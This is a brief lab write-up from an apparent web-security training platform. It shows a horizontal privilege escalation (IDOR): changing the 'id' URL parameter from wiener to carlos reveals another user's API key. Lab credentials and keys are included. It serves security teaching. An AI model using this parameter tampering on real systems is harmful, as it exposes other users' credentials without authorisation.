 *This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peter* 
 
 Logging with the given credentials gives us the API key for *wiener* as well as the user ID in the request parameter. 
 ```URL
 https://0ae0009d03f01b1f82e875d300ec00a3.web-security-academy.net/my-account?id=wiener
```

```
My Account

Your username is: wiener
Your API Key is: Gzp97OSX5KSnZSISMC2UZoJjMqkKAcnB
```

I changed the user ID in the request parameter to *carlos* and was given the following API key! 
```URL 
My Account

Your username is: carlos
Your API Key is: w5eiak2EyugMjuBOa4V9zVaxbUKlhsoc
```